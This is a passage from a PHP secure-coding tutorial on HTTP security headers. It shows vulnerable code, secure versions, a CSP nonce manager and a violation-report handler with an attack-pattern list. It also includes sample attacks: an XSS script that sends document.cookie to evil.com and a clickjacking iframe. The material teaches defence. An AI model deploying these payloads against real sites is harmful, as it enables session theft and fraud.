**Additional Protections**:

- **Permissions-Policy header**: Disables potentially dangerous browser features (geolocation, camera, microphone, payment)
- **Server header removal**: Prevents information disclosure about backend technology
- **Request timeout configuration**: Prevents slowloris and similar DoS attacks
- **Request ID propagation**: Enables distributed tracing and incident investigation
- **Environment-aware configuration**: Stricter settings automatically applied in production
- **Preflight caching**: `Access-Control-Max-Age` reduces OPTIONS requests overhead while maintaining security

Your website is likely vulnerable without proper security headers. Missing security headers are a common misconfiguration that enables attacks like XSS, clickjacking, and MIME-type sniffing. The British Airways breach in 2018 demonstrated how missing Content-Security-Policy headers allowed Magecart attackers to inject and execute malicious JavaScript, stealing 380,000 payment cards.

**VULNERABLE CODE**:

```php
<?php
// Basic PHP page without security headers - VULNERABLE

session_start();

// Process user request
$page = $_GET['page'] ?? 'home';

// Render page content
function renderPage($pageName) {
    $allowedPages = ['home', 'about', 'contact', 'products'];

    if (in_array($pageName, $allowedPages)) {
        include "templates/{$pageName}.php";
    } else {
        include "templates/404.php";
    }
}

// No security headers set - browser uses default (insecure) behavior
echo "<!DOCTYPE html>\n<html>\n<head>\n<title>My Website</title>\n</head>\n<body>";
renderPage($page);
echo "</body>\n</html>";
?>
```

**Attack Vectors**:

```html
<!-- XSS attack enabled by missing CSP -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Clickjacking attack enabled by missing X-Frame-Options -->
<iframe src="https://victim-site.com/transfer-money" style="opacity:0"></iframe>
```

**Why This Is Dangerous**:
- **No Content-Security-Policy**: Browsers execute any inline script or load resources from any domain, enabling XSS attacks
- **No X-Frame-Options**: Site can be embedded in malicious iframes for clickjacking
- **No X-Content-Type-Options**: Browsers may MIME-sniff responses, potentially executing malicious files
- **No Strict-Transport-Security**: Users can be downgraded to HTTP, enabling man-in-the-middle attacks
- **No Referrer-Policy**: Sensitive URLs may leak to third parties

**SECURE VERSION**:

```php
<?php
// Secure PHP page with comprehensive security headers

// SECURITY: Set headers BEFORE any output
function setSecurityHeaders() {
    // Prevent clickjacking - page cannot be embedded in frames
    header("X-Frame-Options: DENY");

    // Prevent MIME-type sniffing attacks
    header("X-Content-Type-Options: nosniff");

    // Enable browser XSS filter (legacy, but still useful)
    header("X-XSS-Protection: 1; mode=block");

    // Force HTTPS for 1 year, include subdomains
    header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");

    // Control referrer information leakage
    header("Referrer-Policy: strict-origin-when-cross-origin");

    // Restrict browser features/APIs
    header("Permissions-Policy: geolocation=(), microphone=(), camera=()");

    // Content Security Policy - restrict resource loading
    header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';");
}

setSecurityHeaders();
session_start();

$page = $_GET['page'] ?? 'home';

function renderPage($pageName) {
    $allowedPages = ['home', 'about', 'contact', 'products'];

    if (in_array($pageName, $allowedPages)) {
        include "templates/{$pageName}.php";
    } else {
        http_response_code(404);
        include "templates/404.php";
    }
}

echo "<!DOCTYPE html>\n<html>\n<head>\n<title>My Website</title>\n</head>\n<body>";
renderPage($page);
echo "</body>\n</html>";
?>
```

**Key Security Controls**:
- **Content-Security-Policy**: Restricts script sources to same origin, preventing injected scripts from executing
- **X-Frame-Options: DENY**: Completely prevents the page from being embedded in any frame
- **Strict-Transport-Security**: Forces browsers to always use HTTPS, preventing downgrade attacks
- **X-Content-Type-Options: nosniff**: Prevents browsers from interpreting files as different MIME types

Great question! Production applications often need dynamic CSP configurations with nonces for inline scripts and allowlisted CDN domains. Here's a comprehensive security header management class with CSP nonce support.

**PRODUCTION PATTERN**:

```php
<?php
/**
 * Production-ready security headers management with CSP nonce support
 * Suitable for applications using CDNs and dynamic inline scripts
 */

class SecurityHeadersManager {
    private string $nonce;
    private array $cspDirectives;
    private array $trustedDomains;
    private bool $reportOnly;
    private string $reportUri;

    public function __construct(array $config = []) {
        // Generate cryptographically secure nonce for each request
        $this->nonce = base64_encode(random_bytes(16));

        // Configuration
        $this->reportOnly = $config['report_only'] ?? false;
        $this->reportUri = $config['report_uri'] ?? '/csp-violation-report';
        $this->trustedDomains = $config['trusted_domains'] ?? [];

        // Default CSP directives
        $this->cspDirectives = [
            'default-src' => ["'self'"],
            'script-src' => ["'self'", "'nonce-{$this->nonce}'"],
            'style-src' => ["'self'", "'nonce-{$this->nonce}'"],
            'img-src' => ["'self'", 'data:', 'https:'],
            'font-src' => ["'self'"],
            'connect-src' => ["'self'"],
            'frame-src' => ["'none'"],
            'frame-ancestors' => ["'none'"],
            'base-uri' => ["'self'"],
            'form-action' => ["'self'"],
            'object-src' => ["'none'"],
            'upgrade-insecure-requests' => []
        ];

        // Add trusted CDN domains
        $this->addTrustedDomains();
    }

    private function addTrustedDomains(): void {
        $cdnMappings = [
            'scripts' => [
                'https://cdn.jsdelivr.net',
                'https://cdnjs.cloudflare.com',
                'https://unpkg.com'
            ],
            'styles' => [
                'https://cdn.jsdelivr.net',
                'https://fonts.googleapis.com'
            ],
            'fonts' => [
                'https://fonts.gstatic.com'
            ],
            'analytics' => [
                'https://www.google-analytics.com',
                'https://www.googletagmanager.com'
            ]
        ];

        foreach ($this->trustedDomains as $type => $domains) {
            switch ($type) {
                case 'scripts':
                    $this->cspDirectives['script-src'] = array_merge(
                        $this->cspDirectives['script-src'],
                        $domains
                    );
                    break;
                case 'styles':
                    $this->cspDirectives['style-src'] = array_merge(
                        $this->cspDirectives['style-src'],
                        $domains
                    );
                    break;
                case 'fonts':
                    $this->cspDirectives['font-src'] = array_merge(
                        $this->cspDirectives['font-src'],
                        $domains
                    );
                    break;
                case 'connect':
                    $this->cspDirectives['connect-src'] = array_merge(
                        $this->cspDirectives['connect-src'],
                        $domains
                    );
                    break;
            }
        }
    }

    public function getNonce(): string {
        return $this->nonce;
    }

    public function buildCSP(): string {
        $directives = [];

        foreach ($this->cspDirectives as $directive => $values) {
            if (empty($values)) {
                $directives[] = $directive;
            } else {
                $directives[] = $directive . ' ' . implode(' ', $values);
            }
        }

        // Add report-uri for violation monitoring
        $directives[] = "report-uri {$this->reportUri}";

        return implode('; ', $directives);
    }

    public function applyHeaders(): void {
        // Prevent clickjacking
        header("X-Frame-Options: DENY");

        // Prevent MIME-type sniffing
        header("X-Content-Type-Options: nosniff");

        // Enable XSS filter
        header("X-XSS-Protection: 1; mode=block");

        // HSTS - Force HTTPS
        if ($this->isHTTPS()) {
            header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
        }

        // Referrer Policy
        header("Referrer-Policy: strict-origin-when-cross-origin");

        // Permissions Policy (formerly Feature-Policy)
        header("Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()");

        // Cross-Origin policies
        header("Cross-Origin-Opener-Policy: same-origin");
        header("Cross-Origin-Resource-Policy: same-origin");
        header("Cross-Origin-Embedder-Policy: require-corp");

        // Content Security Policy
        $cspHeader = $this->reportOnly 
            ? "Content-Security-Policy-Report-Only" 
            : "Content-Security-Policy";
        header("{$cspHeader}: {$this->buildCSP()}");
    }

    private function isHTTPS(): bool {
        return (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
            || $_SERVER['SERVER_PORT'] == 443
            || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
    }
}

// CSP Violation Report Handler
class CSPViolationHandler {
    private $logger;
    private $alertThreshold;

    public function __construct($logger, int $alertThreshold = 100) {
        $this->logger = $logger;
        $this->alertThreshold = $alertThreshold;
    }

    public function handleReport(): void {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            return;
        }

        $rawData = file_get_contents('php://input');
        $report = json_decode($rawData, true);

        if (!$report || !isset($report['csp-report'])) {
            http_response_code(400);
            return;
        }

        $violation = $report['csp-report'];

        // Log the violation
        $this->logger->warning('CSP Violation', [
            'blocked_uri' => $violation['blocked-uri'] ?? 'unknown',
            'violated_directive' => $violation['violated-directive'] ?? 'unknown',
            'document_uri' => $violation['document-uri'] ?? 'unknown',
            'source_file' => $violation['source-file'] ?? 'unknown',
            'line_number' => $violation['line-number'] ?? 0,
            'client_ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'timestamp' => date('c')
        ]);

        // Check for attack patterns
        $this->detectAttackPatterns($violation);

        http_response_code(204);
    }

    private function detectAttackPatterns(array $violation): void {
        $suspiciousPatterns = [
            'eval',
            'inline',
            'data:',
            '.ru/',
            '.cn/',
            'malware',
            'exploit'
        ];

        $blockedUri = $violation['blocked-uri'] ?? '';

        foreach ($suspiciousPatterns as $pattern) {
            if (stripos($blockedUri, $pattern) !== false) {
                $this->logger->alert('Potential XSS Attack Detected', [
                    'blocked_uri' => $blockedUri,
                    'pattern_matched' => $pattern,
                    'client_ip' => $_SERVER['REMOTE_ADDR']
                ]);
                break;
            }
        }
    }
}

// Usage Example
$securityHeaders = new SecurityHeadersManager([
    'report_only' => false, // Set to true for testing
    'report_uri' => '/api/csp-report',
    'trusted_domains' => [
        'scripts' => ['https://cdn.jsdelivr.net'],
        'styles' => ['https://fonts.googleapis.com'],
        'fonts' => ['https://fonts.gstatic.com'],
        'connect' => ['https://api.myapp.com']
    ]
]);

$securityHeaders->applyHeaders();
$nonce = $securityHeaders->getNonce();

// Store nonce for use in templates
$GLOBALS['csp_nonce'] = $nonce;
?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure Application</title>
    <!-- Inline styles with nonce -->
    <style nonce="<?= htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8') ?>">
        body { font-family: Arial, sans-serif; }
    </style>
</head>
<body>
    <h1>Welcome</h1>

    <!-- Inline script with nonce - ALLOWED -->
    <script nonce="<?= htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8') ?>">
        console.log('This script is allowed by CSP nonce');
    </script>

    <!-- External script from trusted CDN - ALLOWED -->
    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
</body>
</html>
```

**Defense in Depth Layers**:

1. **CSP with Nonces**: Only scripts with valid nonces execute, preventing injected scripts
```php
// Each request gets unique nonce
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'nonce-{$nonce}'");
```

2. **Violation Reporting**: Monitor and detect attacks in real-time
```php
// CSP reports sent to endpoint for analysis
header("Content-Security-Policy: ... report-uri /csp-report");
```

3. **Multiple Header Layers**: Defense even if one control is bypassed
```php
// X-Frame-Options AND frame-ancestors for clickjacking protection
header("X-Frame-Options: DENY");
// CSP frame-ancestors provides same protection for modern browsers
```

**Additional Protections**:
- **Report-Only Mode**: Test CSP policies without breaking functionality before enforcement
- **Subresource Integrity (SRI)**: Verify CDN scripts haven't been tampered with
- **Automatic Nonce Rotation**: New nonce per request prevents nonce prediction
- **Cross-Origin Policies**: Protect against Spectre-style side-channel attacks
- **Alert on Attack Patterns**: Immediate notification when suspicious violations occur

